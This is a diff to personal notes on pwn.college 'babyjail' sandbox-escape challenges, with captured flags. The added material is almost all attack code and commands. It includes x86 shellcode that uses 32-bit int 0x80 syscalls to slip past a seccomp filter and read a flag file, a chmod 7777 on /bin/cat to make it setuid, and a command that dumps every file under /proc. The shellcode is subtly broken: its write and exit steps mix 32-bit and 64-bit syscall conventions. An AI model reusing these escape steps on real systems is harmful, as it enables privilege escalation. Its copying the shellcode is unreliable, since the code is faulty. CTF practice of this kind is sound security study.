@@ -231,7 +231,7 @@ flag:
 openat_flag:
 	.ascii "flag\0"
 
-gcc -nostdlib -o solve.elf open.s
+gcc -nostdlib -o solve.elf open9.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
@@ -283,15 +283,43 @@ pwn.college{Mg_bgz4gSfzRuIhY2R0liVUNjEX.QX1MjMscTOxUzW}
 
 
 
+
+
+
 ==========================================================================================
 
 # 8
+
 
 ==========================================================================================
 
 # 9 -> seccomp
 # int 0x80 -> use syscalls for 32 bit mode
 
+ #open
+    xor ecx, ecx
+    lea ebx, [eip+flag]
+    mov eax, 5
+    int 0x80
+
+    #read
+    mov ebx, eax
+    mov ecx, esp
+    mov edx, 28
+    mov eax, 3
+    int 0x80
+
+    #write files
+	mov edi, 1      #write to stdout
+	mov esi, esp    #moves file to write 
+	mov edx, eax    #reads # of bytes to write
+	mov eax, 1
+	int 0x80
+
+    #exit
+	mov eax, 60
+	mov eax, 42
+	syscall
 
 ==========================================================================================
 
@@ -407,14 +435,25 @@ cd old
 cat flag
 pwn.college{wVPM0J0hUNYtZXVYwh0BrWaHzai.01NwMzMscTOxUzW}
 
+==========================================================================================
 
+# 15
 
+vm connect
 
+/challenge/babyjail15
+chmod 7777 /bin/cat
 
+in vm
+/usr/bin /flag
+pwn.college{MDyv3xGbhnW9WV3JoQC6hjMbtrx.0FOwMzMscTOxUzW}
 
+==========================================================================================
 
+# 16
 
-
+cat /proc/*/*/*/* > catProc
+pwn.college{geCajJA4YcEYCAe2LAD7R1VfKQG.0VOwMzMscTOxUzW}
 
 
 
